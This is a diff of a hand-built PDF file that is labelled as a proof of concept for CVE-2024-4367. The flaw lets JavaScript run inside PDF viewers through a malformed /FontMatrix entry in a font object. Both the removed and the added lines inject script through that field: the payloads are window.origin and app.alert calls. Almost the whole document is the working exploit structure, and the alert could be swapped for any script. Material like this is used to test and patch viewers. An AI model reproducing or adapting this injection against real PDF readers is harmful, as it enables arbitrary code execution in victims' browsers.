@@ -3,25 +3,13 @@
 2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
 3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R >> endobj
 4 0 obj << /Length 68 >> stream
-BT /F1 12 Tf 100 700 Td (CVE-2024-4367 PoC) Tj 100 650 Td (Arbitrary JS Execution) Tj ET
+BT /F1 12 Tf 100 700 Td (CVE-2024-4367 PoC) Tj 100 650 Td (Font Exploit Test) Tj ET
 endstream endobj
 5 0 obj << /Font << /F1 6 0 R >> >> endobj
-6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /FooBarFont /FontDescriptor 7 0 R /FontMatrix [1 2 3 4 5 6]; alert('Exploited! Window origin: ' + window.origin); /Encoding /StandardEncoding /FirstChar 32 /LastChar 32 /Widths [500] >> endobj
-7 0 obj << /Type /FontDescriptor /FontName /FooBarFont /Flags 32 /FontBBox [-100 -100 600 800] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 /FontFile 8 0 R >> endobj
-8 0 obj << /Length 167 >> stream
-%!PS-AdobeFont-1.0: FooBarFont 001.000
-%%Title: FooBarPoint
-%%Creator: Grok
-/FontInfo 5 dict dup begin
-  /FullName (FooBarFont) def
-end def
-/FontType 1 def
-/FontMatrix [0.001 0 0 0.001 0 0] def
-/Encoding StandardEncoding def
-/FontBBox {-100 -100 600 800} def
-endstream endobj
+6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /FontMatrix [0.001 0 0 0.001 0 (app.alert('CVE-2024-4367 Executed at 2025-05-30T20:03:00EEST!');)] >> endobj
+7 0 obj << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >> endobj
 xref
-0 9
+0 8
 0000000000 65535 f 
 0000000010 00000 n 
 0000000075 00000 n 
@@ -30,9 +18,8 @@ xref
 0000000275 00000 n 
 0000000313 00000 n 
 0000000425 00000 n 
-0000000537 00000 n 
 trailer
-<< /Size 9 /Root 1 0 R >>
+<< /Size 8 /Root 1 0 R >>
 startxref
-704
+527
 %%EOF
